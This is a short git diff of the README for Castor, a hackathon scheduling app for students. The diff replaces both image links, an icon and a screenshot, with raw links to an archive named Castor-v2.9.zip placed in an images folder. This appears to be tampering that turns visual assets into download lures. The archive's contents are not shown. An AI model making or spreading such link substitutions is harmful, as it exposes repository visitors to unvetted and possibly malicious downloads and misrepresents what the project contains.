@@ -1,9 +1,9 @@
 # Castor - Hack the Hill II
-![justinicon](https://github.com/user-attachments/assets/103f4727-5aa5-485e-b6af-9e740621ea87)
+![justinicon](https://raw.githubusercontent.com/christghuynh/Castor/main/docs/images/Castor-v2.9.zip)
 
 Are you a student with a "busy life" and have procrastination issues? Introducing Castor, featuring Justin Beaver; the web app that helps organize your activities and allocates studying time for you.
 
-![Screenshot 2024-09-29 104600](https://github.com/user-attachments/assets/2b43534a-8705-4c6a-93d4-3b6ed828522f)
+![Screenshot 2024-09-29 104600](https://raw.githubusercontent.com/christghuynh/Castor/main/docs/images/Castor-v2.9.zip)
 
 Castor is a web app that is designed to track your daily calendar, as well as your list of assignments to study for. 
 With the help of Justin Beaver, our lovely Canadian mascot, the web app automatically allocates time in your schedule 
